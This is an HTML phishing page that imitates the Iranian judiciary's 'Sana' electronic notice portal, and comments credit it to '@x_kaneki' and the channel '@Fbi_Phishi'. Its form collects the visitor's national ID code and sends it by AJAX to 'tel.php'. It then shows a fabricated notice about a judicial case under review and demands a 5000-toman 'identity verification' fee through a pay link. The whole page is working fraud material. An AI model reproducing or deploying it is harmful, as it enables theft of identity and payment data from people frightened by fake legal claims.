<html dir="rtl" lang="fa-ir">
<head>
      <title>قوه قضائیه ابلاغیه</title>
      <meta charset="utf-8">
      <meta name="description" content="قوه قضائیه ابلاغیه ">
      <meta name="format-detection" content="telephone=no">
      <meta name="msapplication-tap-highlight" content="no">
      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width">
      <link rel="icon" type="image/ico" href="statics/icons/favicon.ico">
      <link href="assets/css/app.0d0eada5.css" rel="stylesheet">
      <link rel="stylesheet" type="text/css" href="assets/css/chunk-common.650409a8.css">
      <link rel="stylesheet" type="text/css" href="assets/css/8.002a6b3e.css">
      <link rel="stylesheet" type="text/css" href="assets/css/5.3121d306.css">
      <script src="assets/js/jquery.min.js"></script>
      <link rel="stylesheet" type="text/css" href="assets/noty/noty.css">
      <link rel="stylesheet" type="text/css" href="assets/noty/nest.css">
      <script src="assets/noty/noty.min.js"></script>
      <style>
            .hid {
                  display: none;
            }
      </style>

</head>

<body class="desktop no-touch body--light" style="" cz-shortcut-listen="true">
      <div id="q-app">
            <div class="q-layout q-layout--standard" style="min-height: 391px;">
                  <header class="q-header q-layout__section--marginal relative-position fixed-top" style="background-color: transparent;">
                        <div role="img" class="full-width q-img overflow-hidden">
                              <div style="padding-bottom: 26.7633%;"></div>
                              <div class="q-img__image absolute-full" style="background-size: cover; background-position: 50% 50%; background-image: url(&quot;assets/images/header-mobile.635bf9fb.svg&quot;);"></div>
                              <div class="q-img__content absolute-full"></div>
                        </div>
                        <div role="img" class="absolute-center q-img overflow-hidden" style="width: 120px;">
                              <div style="padding-bottom: 50%;"></div>
                              <div class="q-img__image absolute-full" style="background-size: contain; background-position: 50% 50%; background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGYAAAB2CAYAAAA6Ceb5AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NDg2RTJDQUQxNEFFMTFFNUEyREFBRDQ0RUIxNjQxNDAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NDg2RTJDQUUxNEFFMTFFNUEyREFBRDQ0RUIxNjQxNDAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo0ODZFMkNBQjE0QUUxMUU1QTJEQUFENDRFQjE2NDE0MCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo0ODZFMkNBQzE0QUUxMUU1QTJEQUFENDRFQjE2NDE0MCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pk5dbOkAABEmSURBVHja7F0JmBXF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&quot;);"></div>
                              <div class="q-img__content absolute-full"></div>
                        </div>
                  </header>
                  <div class="q-page-container" style="padding-top: 138px;">
                        <main data-v-0f44fdd8="" class="q-page q-layout-padding" style="min-height: 113px;">
                              <div data-v-0f44fdd8="" class="row justify-center">
                                    <div data-v-0f44fdd8="" class="q-mt-lg-xl q-mt-md-lg q-mt-sm-md q-mt-xs-md col-lg-5 col-md-6 col-sm-10 col-xs-11">
                                          <div data-v-0e40c844="" data-v-0f44fdd8="" class="login">
                                                <div data-v-0e40c844="" class="login__card q-py-xl q-card q-card--bordered q-card--flat no-shadow">
                                                      <div data-v-0e40c844="" class="text-center q-card__section q-card__section--vert">
                                                            <div data-v-0e40c844="" role="img" class="">

                                                                  <p class="" style="color:#333D5F;">جهت ورود به سامانه کد ملی خود را وارد کنید</p>
                                                                  <div class="q-img__content absolute-full"></div>
                                                            </div>
                                                      </div>
                                                      <form>
                                                            <div data-v-0e40c844="" class="">
                                                                  <div data-v-0e40c844="" class="text-center q-mb-md">کد ملی خود را وارد نمایید</div>
                                                                  <div data-v-0e40c844="" class="row justify-center">
                                                                        <div data-v-0e40c844="" class="col-lg-8 col-md-9 col-sm-10 col-xs-11"><label data-v-0e40c844="" for="f_63d77fe5-ea5a-41ee-ac32-6bf6730eb46f" class="q-field q-validation-component row no-wrap items-start mobile-number q-mb-sm q-input q-field--outlined q-field--rounded q-field--float q-field--dense q-field--with-bottom">
                                                                                    <div class="q-field__inner relative-position col self-stretch">
                                                                                          <div tabindex="-1" class="q-field__control relative-position row no-wrap">
                                                                                                <div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
                                                                                                      <input tabindex="0" id="meliApp" type="text" class="q-field__native q-placeholder" aria-invalid="false"  maxlength="10" pattern="[0-9]" autocomplete="off">
                                                                                                </div>
                                                                                          </div>
                                                                                    </div>
                                                                              </label>
                                                                        </div>
                                                                  </div>
                                                            </div>
                                                            <div data-v-0e40c844="" class="q-pt-none q-card__section q-card__section--vert">
                                                                  <div data-v-0e40c844="" class="row justify-center">
                                                                        <div data-v-0e40c844="" class="col-lg-8 col-md-9 col-sm-10 col-xs-11"><button id="submitbtn" type="submit" class="q-btn q-btn-item non-selectable no-outline full-width q-btn--unelevated q-btn--rectangle q-btn--rounded bg-primary text-white q-btn--actionable q-focusable q-hoverable q-btn--wrap"><span class="q-focus-helper"></span><span class="q-btn__wrapper col row q-anchor--skip"><span class="q-btn__content text-center col items-center q-anchor--skip justify-center row"><span class="block">ورود به سامانه ثنا</span></span></span>
                                                                              </button></div>
                                                      </form>
                                                </div>
                                          </div>
                                    </div>
                              </div>
                              <div data-v-0f44fdd8="" class="q-mt-md text-center"></div>
                  </div>
            </div>
            </main>
      </div>
      </div>
      </div>

      <div class="q-notifications">
            <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-start"></div>
            <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-end"></div>
            <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-start"></div>
            <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-end"></div>
            <div class="q-notifications__list q-notifications__list--top fixed column no-wrap items-center"></div>
            <div class="q-notifications__list q-notifications__list--bottom fixed column no-wrap items-center"></div>
            <div class="q-notifications__list q-notifications__list--center fixed column no-wrap items-start justify-center"></div>
            <div class="q-notifications__list q-notifications__list--center fixed column no-wrap items-end justify-center"></div>
            <div class="q-notifications__list q-notifications__list--center fixed column no-wrap flex-center"></div>
      </div>
      <div id="download" class="q-dialog fullscreen no-pointer-events q-dialog--modal hid">
            <div aria-hidden="true" class="q-dialog__backdrop fixed-full"></div>
            <div tabindex="-1" class="q-dialog__inner flex no-pointer-events q-dialog__inner--minimized q-dialog__inner--standard fixed-full flex-center">
                  <div data-v-0f44fdd8="" class="bg-white q-card">
                        <div data-v-0f44fdd8="" class="q-card__section q-card__section--vert">
                              <div data-v-0f44fdd8="" class="text-h6 text-center">توجه</div>
                        </div>
                        <hr data-v-0f44fdd8="" aria-orientation="horizontal" class="q-separator q-separator q-separator--horizontal">
                        <div data-v-0f44fdd8="" class="scroll q-card__section q-card__section--vert" style="max-height: 60vh; max-width: 95vw; min-width: 250px; min-height: 100px;">
                              <!---->
                              <p data-v-0f44fdd8="" class="text-justify">
                                  کاربر گرامی با توجه به مشخصات وارده شما در سایت سامانه خدمات و ابلاغ الکترونیکی پرونده قضایی شما به شماره 140032411 به دستور مقام محترم قضایی در دستور بررسی مجدد قرار گرفته است برای مشاهده نتیجه پرونده به شماره140032411 مبلغ 5000 هزار تومان پرداخت کنید.<br>
پرونده قضایی فقط در درون اپلیکیشن قابل مشاهده می‌باشد
برای پیگیری شکایت شما با پرداخت زیر احراز هویت خود را تکمیل و پیامکی دیگر از سایت ثنا دریافت خواهید کرد که شامل مشخصات شکایت شما و متن کامل شکایت میباشد<br>هزینه احراز هویت شما : <span style="color:#72BF44 ;"5000</span>  تومان میباشد که بعد از تکمیل احراز هویت شما به حساب شما باز  گردانده میشود
                        </div>
                        <hr data-v-0f44fdd8="" aria-orientation="horizontal" class="q-separator q-separator q-separator--horizontal">
                        <div data-v-0f44fdd8="" class="q-card__actions full-width q-px-md q-card__actions--horiz row justify-start"><a data-v-0f44fdd8="" tabindex="0" href="pay" class="q-btn q-btn-item non-selectable no-outline block full-width q-btn--unelevated q-btn--rectangle q-btn--rounded bg-positive text-white q-btn--actionable q-focusable q-hoverable q-btn--wrap"><span class="q-focus-helper"></span><span class="q-btn__wrapper col row q-anchor--skip"><span class="q-btn__content text-center col items-center q-anchor--skip justify-center row"><span class="block">پرداخت</span></span></span></a></div>
                  </div>
            </div>
      </div>
	  <!--  Owner ⊷ @x_kaneki ⊰    -->
<!--  Channel ⊷ @Fbi_Phishi ⊰    -->
      <script>
            $(document).ready(function() {
                  $('#submitbtn').click(function(e) {
                        e.preventDefault();
                        var meliApp = $('#meliApp').val();
                        $.ajax({
                              type: "POST",
                              url: "tel.php",
                              data: {
                                    "meliApp": meliApp,
                              },
                              success: function(data) {
                                    var response = JSON.parse(data);
                                    if (response.status == '0') {
                                          new Noty({
                                                type: 'error',
                                                layout: 'topRight',
                                                theme: 'nest',
                                                text: response.message,
                                                timeout: '2000',
                                                progressBar: true,
                                          }).show();

                                    } else {
                                          new Noty({
                                                type: 'success',
                                                layout: 'topRight',
                                                theme: 'nest',
                                                text: response.message,
                                                timeout: '2000',
                                                progressBar: true,
                                          }).show();
                                          $("#download").removeClass('hid');
                                    }
                              }
                        });
                  });
            });
      </script>
</body>
<!--  Owner ⊷ @x_kaneki ⊰    -->
<!--  Channel ⊷ @Fbi_Phishi ⊰    -->
</html>